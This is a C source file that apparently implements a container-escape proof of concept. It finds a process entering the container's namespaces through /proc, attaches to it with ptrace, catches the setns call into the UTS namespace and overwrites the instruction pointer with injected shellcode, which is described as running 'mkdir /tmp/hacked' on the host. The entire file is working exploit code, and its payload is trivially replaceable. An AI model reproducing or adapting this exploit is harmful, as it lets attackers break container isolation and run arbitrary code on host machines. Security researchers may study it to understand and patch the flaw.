#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sched.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>

// Shellcode executed on host machine.
// This code is equivalent to "mkdir /tmp/hacked".
char *shellcode = "\x48\x31\xd2\x52\x48\xb8\x2f\x2f\x2f\x6d\x6b\x64\x69\x72\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x50\x48\x89\xe7\x52\x48\xbb\x2f\x2f\x68\x61\x63\x6b\x65\x64\x53\x48\xbb\x2f\x74\x6d\x70\x2f\x2f\x2f\x2f\x53\x48\x89\xe6\x52\x56\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05";

int main (int argc, char **argv) {
  DIR *dir;
  FILE *fp;
  struct dirent *dp;
  int pid = 999;
  int ppid = 999;
  int found = 0;

  // Find the process that has entered the current namespace.
  for (found = 0; found == 0;) {
    dir = opendir("/proc");
    if (dir == NULL) {
      perror("opendir");
      return 1;
    }

    for (dp = readdir(dir); dp != NULL; dp = readdir(dir)) {
      int len = 11 + strlen(dp->d_name) + 1;
      char *stat_file = malloc(len);
      if (stat_file == NULL) {
        perror("malloc");
        return 1;
      }
      snprintf(stat_file, len, "/proc/%s/stat", dp->d_name);
      fp = fopen(stat_file, "r");

      if (fp != NULL) {
        fscanf(fp, "%d %*s %*c %d", &pid, &ppid);
        fclose(fp);
        // The PPID of the process newly joining the namespace is 0.
        // The PID 1 is the container's init process, so it is excluded.
        if (pid != 1 && ppid == 0) {
          printf("Found: %s\n", stat_file);
          found = 1;
          break;
        }
      }
      free(stat_file);
    }
    closedir(dir);
  }

  // Ptrace the process that have entered the namespace.
  int status;
  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
    perror("ptrace");
    return 1;
  }
  if (waitpid(pid, &status, 0) < 0) {
    perror("waitpid");
    return 1;
  }
  if (WIFSTOPPED(status)) {
    printf("Process is stopped by signal %d\n", WSTOPSIG(status));
  } else {
    fprintf(stderr, "Process is exited/terminated by status: %d\n", status);
    return 1;
  }

  // Loop until it finds a syscall that joins the next namespace.
  while (1) {
    // Resume tracing until the next syscall.
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    if (waitpid(pid, &status, 0) < 0) {
      perror("waitpid");
      return 1;
    }

    // If the process stops for reasons other than SIGTRAP, it will be killed.
    if (!(WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP)) {
      fprintf(stderr, "Process is exited/terminated by status: %d\n", status);
      return 1;
    }

    // Get process registers.
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
      perror("ptrace GETREGS");
      return 1;
    }

    // Skip if syscall-enter-stop
    if (regs.rax != -ENOSYS) {
      continue;
    }

    // CLONE_NEWUTS is the next namespace of the PID namespace.
    // By changing the value pointed to by the rip register, it is prevented from entering other namespaces, and arbitrary code can be executed.
    if (regs.orig_rax == SYS_setns && regs.rsi == CLONE_NEWUTS) {
      int size = strlen(shellcode);
      char *buf = (char*)malloc(size);
      if (buf == NULL) {
        perror("malloc shellcode buffer");
        return 1;
      }
      // Reset and set the shellcode buffer.
      memset(buf, 0x0, size);
      memcpy(buf, shellcode, size);
      printf("Writing shell code...\n");
      int i;
      for (i = 0; i < size; i++) {  
        if (ptrace(PTRACE_POKETEXT, pid, regs.rip + i, *(int *)(buf + i)) < 0) {
          perror("ptrace POKETEXT");
          return 1;
        }
      }

      // Detach the process, After this, the shellcode is executed.
      if (ptrace(PTRACE_DETACH, pid, 0, 0) < 0) {
        perror("ptrace DETACH");
        return 1;
      }
      free(buf);
      break;
    }
  }
 
  return 0;
}
